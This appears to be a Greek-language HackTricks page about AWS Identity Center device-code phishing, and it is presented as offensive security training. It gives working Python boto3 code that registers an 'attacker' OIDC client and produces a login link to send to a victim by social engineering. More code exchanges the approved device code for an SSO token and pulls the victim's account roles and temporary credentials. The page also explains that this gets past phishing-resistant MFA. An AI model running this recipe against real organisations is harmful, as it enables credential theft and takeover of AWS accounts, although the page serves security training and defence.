# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../banners/hacktricks-training.md}}

## AWS Device Code Phishing

Αρχικά προτάθηκε σε [**αυτή την ανάρτηση**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), είναι δυνατόν να σταλεί ένα **link** σε έναν χρήστη χρησιμοποιώντας το AWS SSO που αν ο **χρήστης αποδεχτεί** ο επιτιθέμενος θα μπορέσει να αποκτήσει ένα **token για να προσποιηθεί τον χρήστη** και να έχει πρόσβαση σε όλους τους ρόλους που μπορεί να έχει πρόσβαση ο χρήστης στο **Identity Center**.

Για να εκτελεστεί αυτή η επίθεση, οι προϋποθέσεις είναι:

- Το θύμα πρέπει να χρησιμοποιεί το **Identity Center**
- Ο επιτιθέμενος πρέπει να γνωρίζει το **subdomain** που χρησιμοποιεί το θύμα `<victimsub>.awsapps.com/start`

Μόνο με τις προηγούμενες πληροφορίες, ο **επιτιθέμενος θα είναι σε θέση να στείλει ένα link στον χρήστη** που αν **αποδεχτεί** θα παραχωρήσει στον **επιτιθέμενο πρόσβαση στον λογαριασμό χρήστη AWS**.

### Attack

1. **Finding the subdomain**

Το πρώτο βήμα του επιτιθέμενου είναι να ανακαλύψει το subdomain που χρησιμοποιεί η εταιρεία του θύματος στο Identity Center τους. Αυτό μπορεί να γίνει μέσω **OSINT** ή **μαντεψιάς + BF** καθώς οι περισσότερες εταιρείες θα χρησιμοποιούν το όνομά τους ή μια παραλλαγή του ονόματός τους εδώ.

Με αυτές τις πληροφορίες, είναι δυνατόν να αποκτηθεί η περιοχή όπου έχει ρυθμιστεί το Identity Center:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Δημιουργήστε τον σύνδεσμο για το θύμα & Στείλτε τον**

Εκτελέστε τον παρακάτω κώδικα για να δημιουργήσετε έναν σύνδεσμο σύνδεσης AWS SSO ώστε το θύμα να μπορεί να αυθεντικοποιηθεί.\
Για την επίδειξη, εκτελέστε αυτόν τον κώδικα σε μια κονσόλα python και μην βγείτε από αυτήν καθώς αργότερα θα χρειαστείτε κάποια αντικείμενα για να αποκτήσετε το token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Στείλτε τον παραγόμενο σύνδεσμο στο θύμα χρησιμοποιώντας τις καταπληκτικές σας ικανότητες κοινωνικής μηχανικής!

3. **Περιμένετε μέχρι το θύμα να το αποδεχτεί**

Αν το θύμα ήταν **ήδη συνδεδεμένο στο AWS**, θα χρειαστεί απλώς να αποδεχτεί την παροχή δικαιωμάτων, αν δεν ήταν, θα χρειαστεί να **συνδεθεί και στη συνέχεια να αποδεχτεί την παροχή δικαιωμάτων**.\
Έτσι φαίνεται η προτροπή σήμερα:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Αποκτήστε το SSO access token**

Αν το θύμα αποδέχτηκε την προτροπή, εκτελέστε αυτόν τον κώδικα για να **δημιουργήσετε ένα SSO token προσποιούμενοι τον χρήστη**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
Το διακριτικό πρόσβασης SSO είναι **έγκυρο για 8 ώρες**.

5. **Μιμηθείτε τον χρήστη**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing του μη phishing MFA

Είναι διασκεδαστικό να γνωρίζουμε ότι η προηγούμενη επίθεση **λειτουργεί ακόμη και αν χρησιμοποιείται ένα "unphisable MFA" (webAuth)**. Αυτό συμβαίνει επειδή η προηγούμενη **ροή εργασίας δεν αφήνει το χρησιμοποιούμενο OAuth domain**. Όχι όπως σε άλλες επιθέσεις phishing όπου ο χρήστης πρέπει να υποκαταστήσει το domain σύνδεσης, στην περίπτωση αυτή η ροή εργασίας του κωδικού συσκευής είναι προετοιμασμένη έτσι ώστε ένας **κωδικός να είναι γνωστός από μια συσκευή** και ο χρήστης μπορεί να συνδεθεί ακόμη και σε διαφορετική μηχανή. Εάν γίνει αποδεκτή η προτροπή, η συσκευή, απλά γνωρίζοντας τον αρχικό κωδικό, θα είναι σε θέση να **ανακτήσει διαπιστευτήρια** για τον χρήστη.

Για περισσότερες πληροφορίες σχετικά με αυτό [**ελέγξτε αυτή την ανάρτηση**](https://mjg59.dreamwidth.org/62175.html).

### Αυτόματα Εργαλεία

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## Αναφορές

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../banners/hacktricks-training.md}}
